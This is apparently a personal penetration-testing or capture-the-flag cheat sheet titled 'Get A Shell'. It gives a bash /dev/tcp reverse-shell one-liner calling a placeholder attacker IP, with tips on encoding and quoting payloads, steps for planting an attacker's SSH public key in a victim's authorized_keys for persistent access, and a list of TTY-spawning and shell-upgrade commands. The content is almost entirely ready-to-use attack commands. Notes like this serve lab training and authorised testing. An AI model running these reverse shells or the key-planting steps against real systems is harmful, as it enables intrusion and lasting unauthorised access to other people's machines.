---
sort : 1
---

# Get A Shell

## Reverse Shell 

[the best place to generate a reverse shell](https://www.revshells.com/)

```note
some times the shell doesn't work, why ?? 

* if it is a bash reverse shell, e.g. bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 , try precede it with `bash -c` 


* try URL encoding / double URL encoding


* quotations conflict, how to deal with it ??
    * embrace the whole payload with double qoutes, then escape the inside ones
    
    * there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
```


<br><br>



## SSH 

### Password Reuse Misconfiguration OR Private Key Leakage : 

```bash
$ ssh Username@Host
    password : ******* 

$ ssh -i PrivateKey Username@Host
```


### Connecting Via SSH is Better ? (.ssh)

you already having a shell ...  

```bash
# On the victim machine

# if you can write on the user dir (create files/dirs)
$ mkdir ".ssh"; cd .ssh ; touch authorized_keys
```

```bash
# On the attacker machine

$ cd /tmp; ssh-keygen  
    # Generating public/private rsa key pair.
    Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
    Enter passphrase (empty for no passphrase):                           # no password 
    Enter same passphrase again:                                          # no password 


$ cat TmpKey.pub | xclip -selection c                                     # copy the public key
```

```bash
# Back to the victim side

$ echo "CTRL+V" >> authorized_keys
```

```bash
# Back to the attacker side

$ ssh -i TmpKey Username@Host
```



### BruteForce Attack

not recommended ^^ :star:


<br><br>



# Spawn a TTY shell 

```bash
# Python
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Script 
$ script /dev/null -c bash

# sh
$ /bin/sh -i

# bash
$ /bin/bash -i

# Echo
$ echo 'os.system('/bin/bash')'

# Perl
$ perl -e 'exec "/bin/sh";'

# From within VI
:!bash
```

```bash
$ export TERM=xterm-256color
$ export SHELL=BASH

# CTRL-Z
$ stty raw -echo; fg
# Enter twice
```